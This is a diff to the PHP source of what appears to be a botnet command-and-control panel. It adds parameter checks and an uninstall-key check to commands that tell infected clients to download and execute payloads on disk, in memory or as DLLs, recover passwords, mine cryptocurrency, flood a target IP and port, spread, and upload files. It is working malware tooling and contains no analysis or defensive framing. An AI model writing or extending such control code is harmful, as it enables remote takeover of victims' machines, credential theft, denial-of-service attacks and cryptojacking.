@@ -1,5 +1,6 @@
 ﻿<?php
 session_start();
+
 if((!isset($_SESSION['user'])) or (!isset($_SESSION['permission']))){
 	header('Location: index.php');
 	exit;
@@ -7,6 +8,19 @@ if((!isset($_SESSION['user'])) or (!isset($_SESSION['permission']))){
 if(!($_SESSION['permission']=='Master')) {
 	echo("You do not have permission to control clients.");
 	exit;
+}
+
+function CheckParam($Two = false){
+	if(empty($_POST['Param1'])){
+		header('Location: dashboard.php?tab=Commands&failure=' . urlencode('A required parameter is missing!'));
+		die();
+	}
+	if($Two){
+		if(empty($_POST['Param2'])){
+			header('Location: dashboard.php?tab=Commands&failure=' . urlencode('A required parameter is missing!'));
+			die();
+		}
+	}
 }
 
 include('data.php');
@@ -38,29 +52,40 @@ switch($Cmd){
 	} break;
 	case 'Update Client':{
 		$Cmd = 'Update';
+		CheckParam();
 		$ParamArray = array('URL'=>$_POST['Param1']);
 	} break;
 	case 'Uninstall Client':{
 		$Cmd = 'Uninstall';
+		CheckParam();
+		if(strtoupper(hash('sha256', $_POST['Param1']))!=UninstallKey){
+			header('Location: dashboard.php?tab=Commands&failure=' . urlencode('Incorrect Uninstall key!'));
+			die();
+		}
 	} break;
 	case 'Download File':{
 		$Cmd = 'Download';
+		CheckParam(true);
 		$ParamArray = array('URL'=>$_POST['Param1'], 'LocalName'=>$_POST['Param2']);
 	} break;
 	case 'Upload File':{
 		$Cmd = 'Upload';
+		CheckParam();
 		$ParamArray = array('FileName'=>$_POST['Param1']);
 	} break;
 	case 'Download and Execute [Drop]':{
 		$Cmd = 'DropExec';
+		CheckParam();
 		$ParamArray = array('URL'=>$_POST['Param1']);
 	} break;
 	case 'Download and Execute [Memory]':{
 		$Cmd = 'MemExec';
+		CheckParam();
 		$ParamArray = array('URL'=>$_POST['Param1']);
 	} break;
 	case 'Download and Execute [DLL]':{
 		$Cmd = 'MemDLL';
+		CheckParam();
 		$ParamArray = array('URL'=>$_POST['Param1']);
 	} break;
 	case 'Recover Passwords':{
@@ -68,10 +93,12 @@ switch($Cmd){
 	} break;
 	case 'Start Mining':{
 		$Cmd = 'Mine';
+		CheckParam();
 		$ParamArray = array('Bitness'=>$_POST['Param1']);
 	} break;
 	case 'Start Flooding':{
 		$Cmd = 'Flood';
+		CheckParam(true);
 		$ParamArray = array('IPAddress'=>$_POST['Param1'], 'Port'=>$_POST['Param2']);
 	} break;
 	case 'Enable Spreading':{
@@ -79,6 +106,7 @@ switch($Cmd){
 	} break;
 	case '🛑 Abort a Command':{
 		$Cmd = 'Abort';
+		CheckParam();
 		$ParamArray = array('CommandID'=>$_POST['Param1']);
 	} break;
 	default:{
